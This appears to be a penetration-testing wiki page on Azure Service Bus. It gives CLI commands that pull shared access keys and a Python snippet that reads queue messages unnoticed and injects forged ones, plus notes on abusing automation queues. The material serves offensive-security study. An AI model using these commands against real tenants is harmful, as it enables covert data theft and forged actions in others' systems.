---
title: "Service Bus: reading and injecting queue and topic messages"
description: "Reading and injecting Azure Service Bus queues and topics through SAS or RBAC access."
keywords:
  - Service Bus
  - queue
  - topic
  - SAS
  - message injection
---

# Service Bus

Azure Service Bus brokers messages between application components over queues (point to point) and topics (publish and subscribe). Access is granted by a **shared access signature** backed by an authorization rule, or by an Azure RBAC data role. A namespace key or connection string you recover (from [app settings](../credentials/app-settings-and-connection-strings.md), a Key Vault, or [Automation assets](../credentials/automation-assets.md)) lets you read the messages in flight, inject forged work a consumer will trust, or drain a queue to break the system behind it.

## Enumerating access

```bash
az servicebus namespace list -o table
az servicebus queue list --namespace-name <ns> -g <rg> -o table
# pull the SAS key behind an authorization rule
az servicebus namespace authorization-rule keys list \
  --namespace-name <ns> -g <rg> --name RootManageSharedAccessKey
```

The `primaryConnectionString` carries a full `SharedAccessKey` that a client SDK uses directly, with no further auth.

## Reading and injecting

```bash
# with the connection string, peek or receive messages and send forged ones
# (Azure CLI has no data-plane send/receive; use the SDK or REST with the SAS token)
python - <<'PY'
from azure.servicebus import ServiceBusClient, ServiceBusMessage
c = ServiceBusClient.from_connection_string("<conn-str>")
with c.get_queue_receiver("<queue>", max_wait_time=5) as r:
    for m in r.peek_messages(10): print(bytes(m))          # read without locking
with c.get_queue_sender("<queue>") as s:
    s.send_messages(ServiceBusMessage('{"job":"forged"}'))  # inject
PY
```

## Exploitation notes

- `peek_messages` reads without locking or completing, so the real consumer still processes them and nothing looks lost.
- A namespace-level `RootManageSharedAccessKey` grants every queue and topic in the namespace; a single leaked connection string is often total messaging access.
- Queues that drive automation (provisioning, billing, deployment workers) turn a forged message into downstream action.

## Tools

- **Azure CLI** (`az servicebus`): namespace, queue, and key enumeration.
- **azure-servicebus** Python SDK / **Service Bus Explorer**: data-plane read and inject.
- **MicroBurst**: surfaces connection strings from app settings and Automation assets.

## References

- [HackTricks Cloud: Azure Service Bus](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft: Service Bus SAS authentication](https://learn.microsoft.com/azure/service-bus-messaging/service-bus-sas)
